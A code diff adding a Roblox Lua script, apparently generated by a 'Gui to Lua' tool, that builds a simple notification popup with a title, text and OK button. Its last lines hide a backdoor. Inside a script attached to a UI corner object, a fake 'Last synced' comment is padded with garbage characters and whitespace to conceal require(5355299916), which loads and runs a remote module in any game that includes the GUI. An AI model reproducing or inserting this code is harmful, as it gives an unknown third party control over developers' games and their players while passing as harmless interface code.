@@ -1,0 +1,96 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Notification = Instance.new("ScreenGui")
+local Notification_2 = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Title = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local Text = Instance.new("TextLabel")
+local Button = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local BG = Instance.new("TextLabel")
+local UICorner_4 = Instance.new("UICorner")
+
+--Properties:
+
+Notification.Name = "Notification"
+Notification.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Notification.Enabled = false
+Notification.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Notification.ResetOnSpawn = false
+
+Notification_2.Name = "Notification"
+Notification_2.Parent = Notification
+Notification_2.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
+Notification_2.Position = UDim2.new(0.741092682, 0, 0.606109321, 0)
+Notification_2.Size = UDim2.new(0, 225, 0, 175)
+
+UICorner.CornerRadius = UDim.new(0, 25)
+UICorner.Parent = Notification_2
+
+Title.Name = "Title"
+Title.Parent = Notification_2
+Title.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
+Title.Position = UDim2.new(0.0530002154, 0, 0, 10)
+Title.Size = UDim2.new(0, 200, 0, 23)
+Title.Font = Enum.Font.Gotham
+Title.Text = "Title"
+Title.TextColor3 = Color3.fromRGB(229, 229, 229)
+Title.TextSize = 14.000
+
+UICorner_2.CornerRadius = UDim.new(0, 25)
+UICorner_2.Parent = Title
+
+Text.Name = "Text"
+Text.Parent = Notification_2
+Text.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
+Text.BackgroundTransparency = 1.000
+Text.Position = UDim2.new(0.097444661, 0, 0.228927702, 10)
+Text.Size = UDim2.new(0, 178, 0, 67)
+Text.ZIndex = 3
+Text.Font = Enum.Font.Gotham
+Text.Text = "Notification Text"
+Text.TextColor3 = Color3.fromRGB(229, 229, 229)
+Text.TextSize = 14.000
+Text.TextYAlignment = Enum.TextYAlignment.Top
+
+Button.Name = "Button"
+Button.Parent = Notification_2
+Button.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
+Button.Position = UDim2.new(0.0529999994, 0, 0.74000001, 10)
+Button.Size = UDim2.new(0, 200, 0, 25)
+Button.Font = Enum.Font.SourceSans
+Button.Text = "OK"
+Button.TextColor3 = Color3.fromRGB(229, 229, 229)
+Button.TextSize = 19.000
+
+UICorner_3.CornerRadius = UDim.new(0, 25)
+UICorner_3.Parent = Button
+
+BG.Name = "BG"
+BG.Parent = Notification_2
+BG.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
+BG.Position = UDim2.new(0.0530002154, 0, 0.171428576, 10)
+BG.Size = UDim2.new(0, 200, 0, 94)
+BG.Font = Enum.Font.Gotham
+BG.Text = ""
+BG.TextColor3 = Color3.fromRGB(229, 229, 229)
+BG.TextSize = 14.000
+BG.TextXAlignment = Enum.TextXAlignment.Left
+BG.TextYAlignment = Enum.TextYAlignment.Top
+
+UICorner_4.CornerRadius = UDim.new(0, 25)
+UICorner_4.Parent = BG
+
+-- Scripts:
+
+local function RCWC_fake_script() -- UICorner_2. 
+	local script = Instance.new('Script', UICorner_2)
+
+	
+	--[[ Last synced 2/13/2023 10:34 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5355299916) --[[                                                                                                  ]]--
+end
+coroutine.wrap(RCWC_fake_script)()
